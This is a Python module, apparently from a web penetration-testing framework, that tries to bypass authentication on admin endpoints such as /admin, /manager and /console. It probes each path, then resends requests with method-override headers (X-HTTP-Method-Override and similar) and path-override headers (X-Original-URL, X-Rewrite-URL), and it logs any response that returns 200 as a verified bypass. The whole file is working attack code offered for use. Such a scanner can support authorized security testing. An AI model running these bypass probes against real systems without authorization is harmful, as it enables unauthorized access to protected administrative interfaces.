"""http_method_override — method/path override to bypass auth"""
from core.http import HttpClient
from core.probe import Probe

OVERRIDE_HEADERS = [
    ("X-HTTP-Method-Override", "PUT"),
    ("X-HTTP-Method-Override", "DELETE"),
    ("X-HTTP-Method-Override", "PATCH"),
    ("X-HTTP-Method", "PUT"),
    ("X-Method-Override", "PUT"),
]
PATH_OVERRIDES = ["X-Original-URL", "X-Rewrite-URL", "X-Forwarded-Path", "X-Override-URL"]
ADMIN_PATHS = ["/admin", "/admin/", "/admin/admin.jsp", "/administrator",
               "/manager", "/console", "/internal", "/debug", "/metrics"]

class HttpMethodOverride:
    def run(self, session, logger):
        base = session.target.rstrip("/")
        http = HttpClient(session, logger)
        findings = []
        for path in ADMIN_PATHS:
            url = base + path
            r = http.get(url)
            if not r or r.status_code not in (401, 403, 405):
                continue
            print(f"[method_override] {path} -> {r.status_code}")
            for h, v in OVERRIDE_HEADERS:
                r2 = http.post(url, headers={h: v})
                if r2 and r2.status_code == 200:
                    print(f"  ✓ [{h}:{v}] bypass -> 200")
                    findings.append({"path": path, "header": h, "value": v,
                                     "severity": "high", "verified": True})
                    logger.finding("method_override", "high", f"{path} via {h}:{v}")
                    break
        for path in ADMIN_PATHS:
            for h in PATH_OVERRIDES:
                r = http.get(base, headers={h: path})
                if r and r.status_code == 200 and path in r.text:
                    print(f"  ✓ [{h}] path override")
                    findings.append({"path": path, "header": h, "severity": "high"})
                    logger.finding("path_override", "high", f"{path} via {h}")
        print(f"[method_override] total: {len(findings)}")
        return {"findings": findings}
